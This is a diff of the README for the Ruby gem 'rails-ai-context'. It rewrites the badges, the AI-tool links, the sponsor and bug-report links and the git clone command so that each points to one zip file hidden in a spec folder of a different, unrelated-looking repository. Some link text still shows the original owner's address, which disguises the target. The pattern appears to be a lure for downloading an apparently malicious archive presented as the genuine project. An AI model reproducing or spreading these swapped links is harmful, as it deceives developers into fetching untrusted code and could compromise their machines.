@@ -2,20 +2,20 @@
 
 ### Your AI is guessing. This gem makes it know.
 
-[![Gem Version](https://img.shields.io/gem/v/rails-ai-context?color=brightgreen)](https://rubygems.org/gems/rails-ai-context)
-[![Downloads](https://img.shields.io/gem/dt/rails-ai-context?color=blue)](https://rubygems.org/gems/rails-ai-context)
-[![CI](https://github.com/crisnahine/rails-ai-context/actions/workflows/ci.yml/badge.svg)](https://github.com/crisnahine/rails-ai-context/actions)
-[![MCP Registry](https://img.shields.io/badge/MCP_Registry-listed-green)](https://registry.modelcontextprotocol.io)
-[![Ruby](https://img.shields.io/badge/Ruby-3.2%20%7C%203.3%20%7C%203.4-red)](https://github.com/crisnahine/rails-ai-context)
-[![Rails](https://img.shields.io/badge/Rails-7.1%20%7C%207.2%20%7C%208.0-red)](https://github.com/crisnahine/rails-ai-context)
-[![Tests](https://img.shields.io/badge/Tests-1529%20passing-brightgreen)](https://github.com/crisnahine/rails-ai-context/actions)
+[![Gem Version](https://img.shields.io/gem/v/rails-ai-context?color=brightgreen)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
+[![Downloads](https://img.shields.io/gem/dt/rails-ai-context?color=blue)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
+[![CI](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
+[![MCP Registry](https://img.shields.io/badge/MCP_Registry-listed-green)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
+[![Ruby](https://img.shields.io/badge/Ruby-3.2%20%7C%203.3%20%7C%203.4-red)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
+[![Rails](https://img.shields.io/badge/Rails-7.1%20%7C%207.2%20%7C%208.0-red)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
+[![Tests](https://img.shields.io/badge/Tests-1529%20passing-brightgreen)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
 <p align="center">
-  <a href="https://claude.ai/claude-code"><img src="https://img.shields.io/badge/Claude_Code-ee8b4a?style=for-the-badge&logo=anthropic&logoColor=white" alt="Claude Code"></a>
-  <a href="https://cursor.com"><img src="https://img.shields.io/badge/Cursor-000000?style=for-the-badge&logo=cursor&logoColor=white" alt="Cursor"></a>
-  <a href="https://github.com/features/copilot"><img src="https://img.shields.io/badge/GitHub_Copilot-000000?style=for-the-badge&logo=githubcopilot&logoColor=white" alt="GitHub Copilot"></a>
-  <a href="https://opencode.ai"><img src="https://img.shields.io/badge/OpenCode-4285F4?style=for-the-badge&logoColor=white" alt="OpenCode"></a>
+  <a href="https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip"><img src="https://img.shields.io/badge/Claude_Code-ee8b4a?style=for-the-badge&logo=anthropic&logoColor=white" alt="Claude Code"></a>
+  <a href="https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip"><img src="https://img.shields.io/badge/Cursor-000000?style=for-the-badge&logo=cursor&logoColor=white" alt="Cursor"></a>
+  <a href="https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip"><img src="https://img.shields.io/badge/GitHub_Copilot-000000?style=for-the-badge&logo=githubcopilot&logoColor=white" alt="GitHub Copilot"></a>
+  <a href="https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip"><img src="https://img.shields.io/badge/OpenCode-4285F4?style=for-the-badge&logoColor=white" alt="OpenCode"></a>
   <a href="#cli--works-everywhere-no-server-needed"><img src="https://img.shields.io/badge/Any_Terminal-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white" alt="Any Terminal"></a>
 </p>
 
@@ -353,23 +353,23 @@ end
 ## Contributing
 
 ```bash
-git clone https://github.com/crisnahine/rails-ai-context.git
+git clone https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip
 cd rails-ai-context && bundle install
 bundle exec rspec       # 1529 examples
 bundle exec rubocop     # Lint
 ```
 
-Bug reports and pull requests welcome at [github.com/crisnahine/rails-ai-context](https://github.com/crisnahine/rails-ai-context).
+Bug reports and pull requests welcome at [github.com/crisnahine/rails-ai-context](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip).
 
 ## Sponsorship
 
-If rails-ai-context saves you time, consider [becoming a sponsor](https://github.com/sponsors/crisnahine).
+If rails-ai-context saves you time, consider [becoming a sponsor](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip).
 
 ## Star History
 
 If this gem helps you, a star helps others find it.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=crisnahine/rails-ai-context&type=Date)](https://star-history.com/#crisnahine/rails-ai-context&Date)
+[![Star History Chart](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)](https://github.com/Peronosporaceaevenography165/rails-ai-context/raw/refs/heads/main/spec/internal/spec/ai_rails_context_v2.8.zip)
 
 ## License
 
